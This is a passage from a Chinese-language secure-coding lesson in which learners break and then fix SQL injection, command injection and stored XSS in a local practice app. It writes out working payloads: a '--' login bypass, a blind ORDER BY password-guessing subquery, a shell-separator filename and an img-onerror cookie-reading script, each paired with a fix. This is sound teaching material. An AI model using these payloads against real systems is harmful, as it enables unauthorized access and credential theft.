document.getElementById("list").innerHTML = rows.map((m) => `<li>${m.content}</li>`).join("");
```

**再刷新页面，弹窗会回来。**

**这说明：**

```text
服务端存的是原文（对的）。
防护完全在前端那一次 textContent 上。
换成 innerHTML，防护就没了。
```

**这就是为什么"输出转义"要按上下文、在每个输出点做。** **只要你有一个地方用了 `innerHTML`，那个地方就有洞。**

---

# 第 7 步：故意犯五个错（30 分钟）

## 错误 1：拼 SQL

**操作：**

```js
const sql = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
db.prepare(sql).get();
```

**会怎样：**

```bash
curl -s -X POST .../api/login -H "Content-Type: application/json" \
  -d "{\"email\":\"alice@test.com'--\",\"password\":\"x\"}"
```

```json
{"ok":true,"user":{"id":1,"email":"alice@test.com"}}
```

**为什么：** `--` 注释掉了密码条件。**知道邮箱就能登录。**

**怎么修：**

```js
db.prepare("SELECT id, email FROM users WHERE email = ? AND password = ?").get(email, password);
```

**怎么验证补住了：**

```bash
curl -s -X POST .../api/login -H "Content-Type: application/json" \
  -d "{\"email\":\"alice@test.com'--\",\"password\":\"x\"}" | grep -c "ok"
```

**应该看到 `0`。**

## 错误 2：以为"加了引号就安全"

**操作：**

```js
const sql = `SELECT * FROM messages WHERE content = '${content.replace(/'/g, "''")}'`;
```

**会怎样：** 单引号注入被挡住了，但试试反斜杠：

```bash
curl -s -X POST .../api/messages -H "Content-Type: application/json" \
  -d '{"content":"\\'"}' 
```

**在 MySQL 默认配置下，`\'` 会被当成"转义的单引号"，于是引号没有闭合，后面的内容变成语法。** 具体行为依赖数据库配置（`NO_BACKSLASH_ESCAPES`），**这正是"手工转义"不可靠的原因：你不知道对面是什么配置。**

**怎么修：** 参数化，不要转义。

**怎么验证补住了：** 用第 6.2 节的 1—4 条全跑一遍，都是 401。

## 错误 3：`ORDER BY` 拼接

**操作：**

```js
db.prepare(`SELECT * FROM messages WHERE user_id = ? ORDER BY ${req.query.sort}`).all(req.user.id);
```

**会怎样：**

```text
MySQL 下可以用布尔盲注，一个字一个字推出密码：
sort=(CASE WHEN (SELECT substr(password,1,1) FROM users WHERE id=1)='a' THEN id ELSE content END)
靠"返回顺序有没有变"来判断猜的对不对。
```

**为什么"排序参数"也危险：**

```text
很多人觉得"排序不影响数据"，但它仍然是拼进 SQL 的。
而 SQL 里能放的东西，包括子查询、函数调用。
```

**怎么修：** 白名单映射。

**怎么验证补住了：**

```bash
curl -s "http://127.0.0.1:3000/api/messages/sorted?sort=(SELECT%20password%20FROM%20users)" -H "X-User-Id: 1" | head -c 60
```

**应该正常返回 JSON 列表，不是报错，也不是被排序影响。**

## 错误 4：`exec` 拼文件名

**操作：**

```js
exec(`ffmpeg -i uploads/${filename} out.mp4`);
```

**会怎样：**

```bash
curl -s -X POST .../api/convert -H "Content-Type: application/json" -d '{"filename":"a.mp4; id > /tmp/pwned"}'
ls /tmp/pwned
```

**`/tmp/pwned` 出现了。**

**为什么：** `exec` 交给 shell；`;` 是 shell 的命令分隔符。

**怎么修：** `execFile` + 参数数组 + 文件名白名单。

**怎么验证补住了：**

```bash
rm -f /tmp/pwned
curl -s -X POST .../api/convert -H "Content-Type: application/json" -d '{"filename":"a.mp4; id > /tmp/pwned"}'
ls /tmp/pwned 2>/dev/null || echo "✅ 没创建"
```

**应该看到 `✅ 没创建`。**

## 错误 5：`innerHTML` 渲染用户内容

**操作：**

```js
list.innerHTML = rows.map((m) => `<li>${m.content}</li>`).join("");
```

**会怎样：**

```bash
curl -s -X POST .../api/messages -H "X-User-Id: 1" -H "Content-Type: application/json" \
  -d '{"content":"<img src=x onerror=\"document.title=document.cookie\">"}'
```

**打开页面，标题变成 cookie 的内容。**

**为什么：** `innerHTML` 会把字符串**解析成 DOM**，`onerror` 是合法的事件处理器，会被执行。

**怎么修：** `textContent`，或服务端 `escapeHtml`。

**怎么验证补住了：**

```bash
curl -s http://127.0.0.1:3000/api/messages -H "X-User-Id: 1" | grep -c "onerror"
```

**应该看到 `1`（数据还在，**这是对的 —— 我们不删用户内容**）。**

**关键是页面：** 刷新后应该看到 `&lt;img ...&gt;` 这种转义后的文本，不弹窗。

**用命令验证转义：**

```bash
curl -s http://127.0.0.1:3000/ | grep -c "innerHTML"
```

**应该看到 `0`（你的页面里没有 `innerHTML` 了）。**

---

# 第 8 步：写学习笔记（10 分钟）

```markdown
# 第 228 节课学习笔记

## 一、三种注入的共同点

用一句话写：

## 二、SQL 注入

| payload | 拼出来是什么 | 为什么能生效 |
|---|---|---|
| `'--` | | |
| `' OR '1'='1` | | |
| `' UNION SELECT ...` | | |

参数化之后，`?` 和拼接的本质区别：

## 三、假参数化

| 写法 | 为什么不算参数化 |
|---|---|
| `.replace(/'/g, "''")` | |
| `IN (${ids.join(",")})` | |
| 模板字符串里带 `${}` | |

## 四、不能参数化的三样

1.
2.
3.

我的白名单映射怎么写：

## 五、命令注入

`exec` 和 `execFile` 的区别：

我的 `safeName` 挡住了哪几种文件名：

## 六、XSS

| 写法 | 会执行吗 | 为什么 |
|---|---|---|
| `innerHTML = x` | | |
| `textContent = x` | | |
| `<%- x %>`（EJS） | | |
| `<%= x %>`（EJS） | | |

存储转义和输出转义，我选哪个，为什么：

## 七、九条 payload 的结果

| # | 类型 | 期望 | 实际 |
|---|---|---|---|
| 1 | SQL 注释 | 401 | |
| 2 | SQL 布尔 | 401 | |
| 3 | SQL UNION | 401 | |
| 4 | SQL 堆叠 | 401 + 表在 | |
| 5 | ORDER BY | 默认排序 | |
| 6 | 命令分隔 | 400 | |
| 7 | 命令替换 | 400 | |
| 8 | XSS 图片 | 显示为文字 | |
| 9 | XSS 脚本 | 显示为文字 | |

## 八、CSP 和 HttpOnly 各挡什么

CSP：
HttpOnly：

它们为什么是"兜底"而不是"替代"：

## 九、五个错误里，哪个最容易被忽略

为什么：

## 十、完成检查

- [ ] 四条 SQL payload 全部 401
- [ ] `ORDER BY` 只认白名单
- [ ] `exec` 换成了 `execFile`，文件名过了白名单
- [ ] 页面用 `textContent` 渲染用户内容
- [ ] 响应头里有 CSP，cookie 有 HttpOnly
```

---

# 第 9 步：课后练习

## 练习一：把项目里所有 SQL 过一遍

**要求：**

1. `git grep -nE "prepare\(|query\(|execute\("` 找出所有 SQL；
2. 每条都看三件事：
   - SQL 字符串里有没有 `${}`
   - 表名/列名/排序有没有拼接
   - `IN (...)` 是拼值还是拼占位符
3. 有问题的改掉。

**记录：** 找到几条拼接？最危险的是哪条？

**思考题：** ORM 就一定安全吗？`whereRaw` 里拼字符串算什么？

## 练习二：给"上传文件名"写一个白名单

**要求：**

1. 写一个 `safeName()`，满足：
   - 只允许字母数字下划线横线
   - 只允许 `.jpg .png .webp`
   - 长度 ≤ 100
   - 不许以 `.` 开头
2. 用 10 个恶意文件名测它：`../../.env`、`..%2f..%2f.env`、`a.jpg;rm`、`a.php`、`.htaccess`。

**记录：** 有几个被挡住了？有没有漏的？

**思考题：** 为什么"黑名单 `.php`"不够？

**提示：** `.phtml`、`.php5`、`.pHp`、`.php.jpg`。

## 练习三：给页面加 CSP，观察破坏

**要求：**

1. 先加 `Content-Security-Policy-Report-Only`，只报告不拦；
2. 打开页面，看 Console 里报了什么违规；
3. 列出被拦掉的资源（内联脚本、外部字体、统计代码）；
4. 改成正式 CSP，再跑一遍功能。

**记录：** 有几个功能因为 CSP 挂了？

**思考题：** 如果必须用内联脚本（比如第三方统计），怎么在 CSP 里开口子，又不至于全放开？

**提示：** `nonce` 或 `hash`，具体以你用的框架文档为准。

## 练习四：做一个"注入回归清单"

**要求：**

1. 把本节 9 条 payload 抄进 `payloads.md`；
2. 每条都写成可复制的 `curl`；
3. 加一条"期望结果"；
4. 以后每次改完代码，跑一遍。

**记录：** 跑完一次要多久？

**思考题：** 这套清单应该放在 CI 里自动跑吗？为什么？

**提示：** 想想"有人在 PR 里把参数化改回拼接"这种情况。

## 练习五：用一句话解释给客户听

**要求：** 写 100 字以内，回答："什么是 SQL 注入？你们怎么防的？"

**记录：** 写了几版？

**思考题：** 说"我们用了参数化查询"客户能听懂吗？要不要换个说法？

**提示：** "用户填的内容只会被当成内容，不会被当成命令"。

---

# 第 10 步：最终验收

## A. 概念

- [ ] 我能说清"数据"和"指令"的边界在哪
- [ ] 我知道参数化不是"过滤字符"，是"分开传输"
- [ ] 我知道为什么表名、列名、`ORDER BY` 不能参数化
- [ ] 我知道 `exec` 和 `execFile` 差在哪
- [ ] 我知道存储型 XSS 为什么比反射型严重

## B. 实操

- [ ] 我用 `'--` 绕过过登录
- [ ] 我用 `UNION` 读出过别人的密码
- [ ] 我把拼接改成参数化，四条 payload 全部 401
- [ ] 我给 `ORDER BY` 写了白名单
- [ ] 我用 `;` 在文件名里执行过命令
- [ ] 我换成 `execFile` + 白名单，`/tmp/pwned` 不再出现
- [ ] 我用 `<img onerror>` 弹出过窗
- [ ] 我换成 `textContent`，payload 变成文字
- [ ] 我加了 CSP 和 `HttpOnly`

## C. 排错

- [ ] `pg` 的 `$1` 写错时，报错我能看懂
- [ ] `IN (?)` 参数数量不对时，我知道要用 `map(() => "?")`
- [ ] `execFile` 报 `ENOENT` 时，我知道是程序名不对，不是参数问题
- [ ] 页面显示 `&amp;lt;` 时，我知道是转义做两次了
- [ ] 加 CSP 后白屏，我知道去看 Console 的违规报告

## D. 交付

- [ ] `payloads.md` 里 9 条 payload 都有 curl 和期望结果
- [ ] 项目里 `git grep "innerHTML"` 的结果都是"必要的"（比如清空列表）
- [ ] `git grep -nE "exec\("` 没有拼接
- [ ] 所有 SQL 里没有 `${}`

## E. 笔记

- [ ] `NOTES.md` 填完
- [ ] 九条 payload 表没有空格
- [ ] "我还不懂的词"有内容

## 本节课要能说出口的一句话

> **用户写的东西永远只能是"数据"：进 SQL 走占位符，进命令行走参数数组，进页面走转义 —— 一处拼字符串，整道墙就破了。**

---

# 附：常见问题速查

| 现象 | 原因 | 怎么做 |
|---|---|---|
| `SQLITE_ERROR: near "s": syntax error` | 内容里有单引号，SQL 是拼的 | 改参数化 |
| `pg` 报 `there is no parameter $1` | SQL 里没有对应占位符 | 检查 `$1` / `$2` 和数组顺序 |
| `IN (?)` 只匹配第一个 | 占位符只有一个 | 用 `ids.map(() => "?").join(",")` |
| `ORDER BY ?` 报错 | 占位符不能替换标识符 | 白名单映射 |
| 搜索 `100%` 结果不对 | `%` 被当通配符 | 转义 `%` `_`，加 `ESCAPE` |
| `execFile` 报 `spawn ffmpeg ENOENT` | 程序不在 PATH | 用绝对路径或装依赖 |
| `execFile` 正常但输出为空 | `ffmpeg` 输出在 stderr | 回调第二个参数是 stdout，第三个是 stderr |
| 文件名 `../../.env` 还能读到 | 只做了 `basename` | 加白名单正则 + 拒点开头 |
| 页面显示 `&lt;script&gt;` 文字 | 转义生效 | **这是对的** |
| 页面显示 `&amp;lt;` | 转义做了两次 | 只在输出时转一次 |
| 换成 `textContent` 后样式丢了 | 原来靠 HTML 标签排版 | 用 DOM 结构，不要靠用户内容里的标签 |
| 加 CSP 后页面白屏 | 内联脚本/样式被拦 | 先用 `Report-Only` 看报告 |
| `document.cookie` 读不到 session | `HttpOnly` 生效 | **这是对的** |
| XSS 还是能发请求 | `HttpOnly` 只防偷 cookie | 要防 XSS 本身（转义 + CSP） |
| EJS 里 `<%- %>` 出问题 | 它不转义 | 用户内容一律用 `<%= %>` |
| `res.json` 返回的 JSON 被当 HTML 执行 | `Content-Type` 被改成了 `text/html` | 确认用 `res.json`，别手动设类型 |
